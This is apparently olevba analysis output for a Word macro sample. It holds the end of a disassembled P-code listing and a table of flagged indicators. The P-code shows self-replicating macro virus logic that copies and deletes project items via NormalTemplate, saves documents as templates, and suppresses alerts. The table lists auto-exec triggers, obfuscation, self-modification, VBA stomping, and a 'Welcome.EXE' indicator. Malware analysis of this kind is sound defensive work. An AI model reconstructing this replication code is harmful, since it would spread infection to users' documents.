' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	StartForVariable 
' 	Next 
' Line #195:
' 	Ld sebarkanPesankuIni 
' 	Ld utusan 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Doc"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #196:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld utusan 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld siManis 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #197:
' 	EndIfBlock 
' Line #198:
' 	StartForVariable 
' 	Next 
' Line #199:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Doc"
' 	Ne 
' 	IfBlock 
' Line #200:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #201:
' 	EndIfBlock 
' Line #202:
' 	Label bukanSalahMuJuga 
' Line #203:
' 	Ld cDA 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #204:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #205:
' 	EndSub 
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0020 " in the name of love, of Aa & Ii"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Welcome.EXE         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

